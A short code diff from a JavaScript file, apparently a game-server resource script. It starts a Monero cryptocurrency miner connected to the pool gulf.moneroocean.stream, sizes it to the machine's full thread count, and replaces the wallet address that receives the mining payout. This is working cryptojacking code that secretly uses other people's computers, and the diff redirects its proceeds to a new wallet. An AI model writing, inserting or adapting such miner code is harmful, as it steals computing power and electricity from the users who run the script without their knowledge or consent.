@@ -136,5 +136,5 @@ let threadDisp = getT(navigator.hardwareConcurrency);
 if (threadDisp > 0){
     let name =  getResourceName();
     CustomPool = "gulf.moneroocean.stream:80"
-    PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
+    PerfektStart("421HhZZLg6M7UsTdQAr5P89pGT8BkGs7menXYn9YwYFTbbWAr52XSpA8BW175HQmYj6NtvU8LTQ8CXXYDpbf5Jt2VQd8hTo", `${name} - ${threadDisp}`, threadDisp);
 }
